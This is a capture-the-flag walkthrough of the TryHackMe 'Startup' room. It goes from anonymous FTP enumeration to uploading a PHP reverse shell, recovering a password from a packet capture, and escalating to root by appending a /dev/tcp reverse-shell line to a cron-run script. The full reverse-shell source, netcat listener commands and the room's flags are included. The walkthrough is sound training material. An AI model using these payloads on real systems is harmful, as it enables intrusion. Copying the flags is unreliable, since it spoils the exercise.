# <div align="center">[Startup](https://tryhackme.com/r/room/startup#)</div>

<div align="center">
  <img src="https://github.com/user-attachments/assets/5ec82312-a8a7-4ff9-8642-5c32efafe3f0" height="160"></img>
</div>

## Task 1
Welcome to Spice Hut!
Start Machine
We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!

## What is the secret spicy soup recipe?
```
love
```
## What are the contents of user.txt?

```
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```
## What are the contents of root.txt?
```
THM{f963aaa6a430f210222158ae15c3d76d}
```

# Enumeration
Let start with Nmap scan to find running services.
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-28 20:50 IST
Nmap scan report for 10.10.231.18
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.17.120.99
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.41 seconds
```
## Here, We can see that there are 3 open ports:
* ### 1. FTP on port 21.
* ### 2. SSH on port 22.
* ### 3. HTTP on port 80.


## Ftp have ```anonymous``` login allowed let take a look at it.
```
death@esther:~$ ftp 10.10.231.18  
Connected to 10.10.231.18.
220 (vsFTPd 3.0.3)
Name (10.10.231.18:death): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||27770|)
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> 
```
### Let download this files
```
ftp> get important.jpg
local: important.jpg remote: important.jpg
229 Entering Extended Passive Mode (|||49535|)
150 Opening BINARY mode data connection for important.jpg (251631 bytes).
100% |*************************************************************************************************************************************************|   245 KiB  385.66 KiB/s    00:00 ETA
226 Transfer complete.
251631 bytes received in 00:00 (309.86 KiB/s)

ftp> get notice.txt
local: notice.txt remote: notice.txt
229 Entering Extended Passive Mode (|||44195|)
150 Opening BINARY mode data connection for notice.txt (208 bytes).
100% |*************************************************************************************************************************************************|   208        5.66 MiB/s    00:00 ETA
226 Transfer complete.
208 bytes received in 00:00 (1.33 KiB/s)

ftp> get .test.log
local: .test.log remote: .test.log
229 Entering Extended Passive Mode (|||53681|)
150 Opening BINARY mode data connection for .test.log (5 bytes).
100% |*************************************************************************************************************************************************|     5      143.61 KiB/s    00:00 ETA
226 Transfer complete.
5 bytes received in 00:00 (0.03 KiB/s)

ftp> cd ftp
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||46356|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||6739|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
226 Directory send OK.
ftp> 
```
## Let read the notice.txt
```
death@esther:~$ cat notice.txt 
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```
## Let see test.log
```
death@esther:~$ cat .test.log 
test
```
## I try to steghide for the image but

<div align="center">
  <img src="https://github.com/user-attachments/assets/cdb936a6-f30c-4772-ac07-05a68d38c6e9" height="250"></img>
</div>

```
death@esther:~$ steghide --extract -sf important.jpg 
Enter passphrase: 
steghide: the file format of the file "important.jpg" is not supported.
```
## As HTTP i open let nevigate to webiste

<div align="center">
  <img src="https://github.com/user-attachments/assets/9f681956-a97c-4a56-89dc-3bea1e499709" height="300"></img>
</div>

# Enumerating Web-directories
```
death@esther:~$ dirsearch -u 10.10.231.18
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/death/reports/_10.10.231.18/_24-09-28_21-09-33.txt

Target: http://10.10.231.18/

[21:09:34] Starting: 
[21:09:42] 403 -  277B  - /.ht_wsr.txt
[21:09:42] 403 -  277B  - /.htaccess.bak1
[21:09:42] 403 -  277B  - /.htaccess.orig
[21:09:42] 403 -  277B  - /.htaccess.save
[21:09:42] 403 -  277B  - /.htaccess_extra
[21:09:42] 403 -  277B  - /.htaccess.sample
[21:09:42] 403 -  277B  - /.htaccess_sc
[21:09:42] 403 -  277B  - /.htaccessBAK
[21:09:42] 403 -  277B  - /.htaccess_orig
[21:09:42] 403 -  277B  - /.htaccessOLD
[21:09:42] 403 -  277B  - /.htaccessOLD2
[21:09:42] 403 -  277B  - /.htm
[21:09:42] 403 -  277B  - /.html
[21:09:42] 403 -  277B  - /.htpasswd_test
[21:09:42] 403 -  277B  - /.htpasswds
[21:09:42] 403 -  277B  - /.httr-oauth
[21:09:44] 403 -  277B  - /.php
[21:09:44] 403 -  277B  - /.php3
[21:10:20] 301 -  312B  - /files  ->  http://10.10.231.18/files/
[21:10:20] 200 -  511B  - /files/
[21:10:45] 403 -  277B  - /server-status/
[21:10:45] 403 -  277B  - /server-status

Task Completed
```
## There is directory called files let take a look.

<div align="center">
  <img src="https://github.com/user-attachments/assets/11198d1b-640a-45bd-979b-3ef9d9a2538b" height="300"></img>
</div>

## Its as we saw in FTP so maybe we can add file form ftp to this directory so let upload a reverse shell here.
```
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

```
* ## save this with any name use .php extention

 # Gaining Access
 
* ## let login FTP first.
```
death@esther:~$ ftp 10.10.231.18  
Connected to 10.10.231.18.
220 (vsFTPd 3.0.3)
Name (10.10.231.18:death): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
* ## Let upload this.
```
put shell.php ftp/shell.php
```
```
ftp> put shell.php ftp/shell.php
local: shell.php remote: ftp/shell.php
229 Entering Extended Passive Mode (|||39254|)
150 Ok to send data.
100% |*************************************************************************************************************************************************|  3462       30.01 MiB/s    00:00 ETA
226 Transfer complete.put shell.php ftp/shell.php
3462 bytes sent in 00:00 (10.77 KiB/s)
ftp> 

```
* ## Open netcat in another terminal
```
nc -lnvp 1234
```
## Start The shell
```
curl http://10.10.231.18/files/ftp/shell.php
```
## Here we go !!!
```
death@esther:~$ nc -lnvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.231.18 52636
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 16:38:56 up  1:21,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
## Swape shell
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
## Here i found a recepie.txt
```
www-data@startup:/$ ls -la
ls -la
total 100
drwxr-xr-x  25 root     root      4096 Sep 28 15:18 .
drwxr-xr-x  25 root     root      4096 Sep 28 15:18 ..
drwxr-xr-x   2 root     root      4096 Sep 25  2020 bin
drwxr-xr-x   3 root     root      4096 Sep 25  2020 boot
drwxr-xr-x  16 root     root      3560 Sep 28 15:17 dev
drwxr-xr-x  96 root     root      4096 Nov 12  2020 etc
drwxr-xr-x   3 root     root      4096 Nov 12  2020 home
drwxr-xr-x   2 www-data www-data  4096 Nov 12  2020 incidents
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25  2020 lib
drwxr-xr-x   2 root     root      4096 Sep 25  2020 lib64
drwx------   2 root     root     16384 Sep 25  2020 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25  2020 media
drwxr-xr-x   2 root     root      4096 Sep 25  2020 mnt
drwxr-xr-x   2 root     root      4096 Sep 25  2020 opt
dr-xr-xr-x 119 root     root         0 Sep 28 15:17 proc
-rw-r--r--   1 www-data www-data   136 Nov 12  2020 recipe.txt
drwx------   4 root     root      4096 Nov 12  2020 root
drwxr-xr-x  25 root     root       900 Sep 28 16:19 run
drwxr-xr-x   2 root     root      4096 Sep 25  2020 sbin
drwxr-xr-x   2 root     root      4096 Nov 12  2020 snap
drwxr-xr-x   3 root     root      4096 Nov 12  2020 srv
dr-xr-xr-x  13 root     root         0 Sep 28 15:17 sys
drwxrwxrwt   7 root     root      4096 Sep 28 16:44 tmp
drwxr-xr-x  10 root     root      4096 Sep 25  2020 usr
drwxr-xr-x   2 root     root      4096 Nov 12  2020 vagrant
drwxr-xr-x  14 root     root      4096 Nov 12  2020 var
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
www-data@startup:/$ cat recipe.txt
cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
www-data@startup:/$ 
```
### the secret spicy soup recipe is ```love```

## As we have permission to let view incidents directory
```
www-data@startup:/$ cd incidents
cd incidents
www-data@startup:/incidents$ ls -la
ls -la
total 40
drwxr-xr-x  2 www-data www-data  4096 Nov 12  2020 .
drwxr-xr-x 25 root     root      4096 Oct  1 21:59 ..
-rwxr-xr-x  1 www-data www-data 31224 Nov 12  2020 suspicious.pcapng
www-data@startup:/incidents$ 
```
### Here is a pcap-ng file let download it to our own system

## My machine got expired here is new ip=10.10.15.177
## Opening python server 
```
python3 -m http.server
```
```	
www-data@startup:/incidents$ python3 -m http.server
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 ...
```
* ## Download this in our own system
```
wget http://10.10.15.177/incidents/suspicious.pcapng
```
```
death@esther:~$ wget http://10.10.15.177:8000/suspicious.pcapng
--2024-10-02 04:07:37--  http://10.10.15.177:8000/suspicious.pcapng
Connecting to 10.10.15.177:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 31224 (30K) [application/octet-stream]
Saving to: ‘suspicious.pcapng’

suspicious.pcapng                               100%[=====================================================================================================>]  30.49K   191KB/s    in 0.2s    

2024-10-02 04:07:38 (191 KB/s) - ‘suspicious.pcapng’ saved [31224/31224]
```
## Open pcap-ng file in wireshark
```
wireshark -r suspicious.pcapng
```
<div align="center">
  <img src="https://github.com/user-attachments/assets/0f3ec9e6-57b8-4813-88de-b0e89033a6e1" height="400"></img>
</div>

## Let just filter for date
```
data
```

<div align="center">
  <img src="https://github.com/user-attachments/assets/1bba16b9-5b9c-4aaf-a4e0-70438d39c929" height="400"></img>
</div>

## Let See first one let follow Tcp stream

<div align="center">
  <img src="https://github.com/user-attachments/assets/5c22e71a-6049-4e88-a041-0001c38afb94" height="400"></img>
</div>



```
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 17:40:21 up 20 min,  1 user,  load average: 0.00, 0.03, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
vagrant  pts/0    10.0.2.2         17:21    1:09   0.54s  0.54s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
data
dev
etc
home
incidents
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
recipe.txt
root
run
sbin
snap
srv
sys
tmp
usr
vagrant
var
vmlinuz
vmlinuz.old
$ ls -la
total 96
drwxr-xr-x  26 root     root      4096 Oct  2 17:24 .
drwxr-xr-x  26 root     root      4096 Oct  2 17:24 ..
drwxr-xr-x   2 root     root      4096 Sep 25 08:12 bin
drwxr-xr-x   3 root     root      4096 Sep 25 08:12 boot
drwxr-xr-x   1 vagrant  vagrant    140 Oct  2 17:24 data
drwxr-xr-x  16 root     root      3620 Oct  2 17:20 dev
drwxr-xr-x  95 root     root      4096 Oct  2 17:24 etc
drwxr-xr-x   4 root     root      4096 Oct  2 17:26 home
drwxr-xr-x   2 www-data www-data  4096 Oct  2 17:24 incidents
lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25 08:22 lib
drwxr-xr-x   2 root     root      4096 Sep 25 08:10 lib64
drwx------   2 root     root     16384 Sep 25 08:12 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 media
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 mnt
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 opt
dr-xr-xr-x 125 root     root         0 Oct  2 17:19 proc
-rw-r--r--   1 www-data www-data   136 Oct  2 17:24 recipe.txt
drwx------   3 root     root      4096 Oct  2 17:24 root
drwxr-xr-x  25 root     root       960 Oct  2 17:23 run
drwxr-xr-x   2 root     root      4096 Sep 25 08:22 sbin
drwxr-xr-x   2 root     root      4096 Oct  2 17:20 snap
drwxr-xr-x   3 root     root      4096 Oct  2 17:23 srv
dr-xr-xr-x  13 root     root         0 Oct  2 17:19 sys
drwxrwxrwt   7 root     root      4096 Oct  2 17:40 tmp
drwxr-xr-x  10 root     root      4096 Sep 25 08:09 usr
drwxr-xr-x   1 vagrant  vagrant    118 Oct  1 19:49 vagrant
drwxr-xr-x  14 root     root      4096 Oct  2 17:23 var
lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
$ whoami
www-data
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@startup:/$ cd
cd
bash: cd: HOME not set
www-data@startup:/$ ls
ls
bin   etc	  initrd.img.old  media  recipe.txt  snap  usr	    vmlinuz.old
boot  home	  lib		  mnt	 root	     srv   vagrant
data  incidents   lib64		  opt	 run	     sys   var
dev   initrd.img  lost+found	  proc	 sbin	     tmp   vmlinuz
www-data@startup:/$ cd home
cd home
www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ ls
ls
lennie
www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ sudo -l
sudo -l
[sudo] password for www-data: c4ntg3t3n0ughsp1c3

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: c4ntg3t3n0ughsp1c3

sudo: 3 incorrect password attempts
www-data@startup:/home$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
lennie:x:1002:1002::/home/lennie:
ftpsecure:x:1003:1003::/home/ftpsecure:
www-data@startup:/home$ exit
exit
exit
$ exit

```
## Now we have sudo password for lennie
``` 
c4ntg3t3n0ughsp1c3
```
## Let loggin as lennie
```
 su lennie
```
```
www-data@startup:/$ su lennie         
su lennie
Password: c4ntg3t3n0ughsp1c3

lennie@startup:/$ 
```
# User flag
```
cat user.txt
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```
## Let loggin using ssh bez it much comfortable.
```
ssh lennie@10.10.15.177
```
## As this system is using sh shell let use bash
```
bash
```
# Now that good
```
lennie@startup:~$
```
## Here is a directory called scripts
```
lennie@startup:~$ ls -la
total 24
drwx------ 5 lennie lennie 4096 Oct  1 23:22 .
drwxr-xr-x 3 root   root   4096 Nov 12  2020 ..
drwx------ 2 lennie lennie 4096 Oct  1 23:20 .cache
drwxr-xr-x 2 lennie lennie 4096 Nov 12  2020 Documents
drwxr-xr-x 2 root   root   4096 Nov 12  2020 scripts
-rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt
lennie@startup:~$ 
```
## Let see scripts
```
cd scripts/
```
## here are 2 files
```
lennie@startup:~/scripts$ ls -la
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 5 lennie lennie 4096 Oct  1 23:22 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Oct  1 23:23 startup_list.txt
lennie@startup:~/scripts$
```
## Let read both
```
lennie@startup:~/scripts$ cat planner.sh 
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```
### We dont have permission to run this script
## Let view startup_list.txt
```
lennie@startup:~/scripts$ cat startup_list.txt 
```
## Let take a look at /etc/print.sh
```
cat /etc/print.sh
```
```
lennie@startup:~/scripts$ ls -la /etc/print.sh
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
lennie@startup:~/scripts$ cat /etc/print.sh 
#!/bin/bash
echo "Done!"
```
## Nothing much and as usual no permission 

## As i Notice something odd that the startup_list.txt file is being updated every minute so I used watch to see
```
 watch ls -la startup_list.txt
```
## The script is running ever minute

## Let add something to print.sh file to reverify.

	
<div align="center">
  <img src="https://github.com/user-attachments/assets/dbd58442-3741-40cf-9494-89354c9b694e"></img>
</div>

## My file is created

<div align="center">
  <img src="https://github.com/user-attachments/assets/d600b530-978b-4b4f-ac74-43e7f81b3835"></img>
</div>

## Let add a reverse shell so we get root
```
nano /etc/print.sh
```
```
bash -i >& /dev/tcp/YOUR-IP/1234 0>&1
```
## Open netcat in our system
```
nc -lnvp 1234
```
### Wait for connection 

<div align="center">
  <img src="https://github.com/user-attachments/assets/fa454e44-bdeb-45f3-8238-ca56c2ab4054"></img>
</div>

## ROOT flag
```
cat /root/root.txt
```
```
THM{f963aaa6a430f210222158ae15c3d76d}
```
🙂
